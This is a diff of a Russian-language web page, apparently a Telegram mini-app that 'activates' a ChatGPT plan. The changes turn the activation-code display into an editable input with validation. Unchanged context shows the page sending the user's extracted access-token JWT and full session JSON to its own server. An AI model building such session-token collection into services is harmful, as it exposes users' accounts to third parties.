@@ -539,8 +539,8 @@
       </div>
     </div>
 
-    <div class="greeting">
-      Привет! 👋 Твой код активации уже подставлен автоматически. Убедись что он верный — и жми «Продолжить».
+    <div class="greeting" id="s1-greeting">
+      Привет! 👋 Твой код активации подставлен автоматически. Проверь — и жми «Продолжить».
     </div>
 
     <div class="card">
@@ -548,13 +548,18 @@
         <div class="card-icon">🎫</div>
         <div class="card-title">Твой код активации</div>
       </div>
-      <div class="code-box" id="code-display">—</div>
-      <div class="code-hint">Автоматически подставлен из твоего заказа</div>
+      <input type="text" id="code-input"
+        placeholder="Введи код активации вручную"
+        oninput="validateCode()"
+        autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"
+        style="font-family:'SF Mono','Fira Code',monospace;font-size:15px;letter-spacing:1px;text-align:center;"
+      />
+      <div class="code-hint" id="code-hint">Подставлен из заказа — можно исправить вручную</div>
     </div>
   </div>
 
   <div class="btn-wrap">
-    <button class="btn btn-green" onclick="showScreen('s2')">Всё верно — продолжить →</button>
+    <button class="btn btn-green" id="s1-continue-btn" onclick="goToStep2()" disabled>Всё верно — продолжить →</button>
   </div>
 </div>
 
@@ -760,8 +765,28 @@
   const preCode  = params.get('code') || '';
 
   // Подставляем код и название плана
-  document.getElementById('code-display').textContent = preCode || '—';
+  const codeInput = document.getElementById('code-input');
+  const s1Btn     = document.getElementById('s1-continue-btn');
+  if (preCode) {
+    codeInput.value = preCode;
+    s1Btn.disabled  = false;
+  } else {
+    document.getElementById('s1-greeting').textContent = 'Код не подставился автоматически. Введи его вручную — он был в сообщении от Александра.';
+    document.getElementById('code-hint').textContent   = 'Посмотри код в чате бота';
+  }
   document.getElementById('success-plan').textContent = `ChatGPT ${planName} активирован`;
+
+  // ── Валидация кода (Шаг 1) ───────────────
+  function validateCode() {
+    const val = codeInput.value.trim();
+    s1Btn.disabled = val.length < 3;
+  }
+
+  function goToStep2() {
+    const val = codeInput.value.trim();
+    if (val.length < 3) return;
+    showScreen('s2');
+  }
 
   // ── Тема ─────────────────────────────────
   const root = document.documentElement;
@@ -867,7 +892,7 @@
         body:    JSON.stringify({
           token:     token,      // извлечённый accessToken JWT
           raw_token: tokenRaw,   // полный JSON сессии — для извлечения account_id на сервере
-          code:      preCode,
+          code:      document.getElementById('code-input').value.trim(),
           init_data: tg.initData
         })
       });
